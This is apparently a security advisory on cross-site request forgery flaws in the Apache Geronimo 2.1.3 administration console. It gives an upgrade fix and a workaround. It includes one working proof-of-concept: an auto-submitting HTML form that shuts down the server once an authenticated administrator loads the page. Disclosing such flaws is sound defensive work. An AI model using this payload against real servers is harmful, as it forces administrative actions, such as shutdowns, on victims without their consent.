Description
***********

Geronimo Server Console multiple XSRF vulnerabilities.

Various cross-site request forgery (XSRF or CSRF) vulnerabilities were identified in the Apache Geronimo web administration console.

This affects all full JavaEE Geronimo releases or other distributions which include the administration web console up to and including Geronimo 2.1.3.



Details
*******

Exploiting this issue may allow a remote attacker to perform certain administrative actions, e.g. change web administration password, upload applications, etc... using predictable URL requests once the user has authenticated and obtained a valid session with the server.

Example [Shutdown Server]:

<html>
        <form action='http://[server]/console/portal//Server/Shutdown/__ac0x3console-base0x2ServerManager!-1172254814|0' id=1>
                <input type=hidden value='Shutdown' name="shutdown">
                <input type=submit>
        </form>
</html>
<script>
        document.getElementById(1).submit();
</script>



Solution
********

This security vulnerabilities fixed in Geronimo 2.1.4 release.

New version of Geronimo 2.1.4 can be downloaded from this location:

An alternative workaround (if you choose to not upgrade to Apache Geronimo 2.1.4) would be to stop or undeploy the administration web console application in the server.
